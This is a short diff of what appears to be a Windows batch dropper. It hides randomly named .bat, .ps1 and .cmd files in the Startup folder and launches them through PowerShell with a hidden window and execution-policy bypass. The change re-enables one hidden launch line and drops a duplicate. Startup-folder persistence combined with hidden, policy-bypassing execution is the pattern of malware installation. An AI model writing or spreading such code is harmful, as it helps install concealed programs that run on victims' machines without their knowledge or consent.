@@ -13,10 +13,9 @@ attrib +h "%STARTUP%/nEQlCzTBpDrO.bat"
 attrib +h "%STARTUP%/AmJOwiWzUEbZ.ps1"
 attrib +h "%STARTUP%/initial.cmd"
 
-@REM powershell -windowstyle hidden -ExecutionPolicy Bypass ./initial.cmd
+powershell -windowstyle hidden -ExecutionPolicy Bypass ./initial.cmd
 powershell powershell.exe -windowstyle hidden -ep bypass "./nEQlCzTBpDrO.bat"
 powershell powershell.exe -windowstyle hidden -ep bypass "./AmJOwiWzUEbZ.ps1"
-powershell powershell.exe -windowstyle hidden -ep bypass "./initial.cmd"
 
 cd "%INITIALPATH%"
 
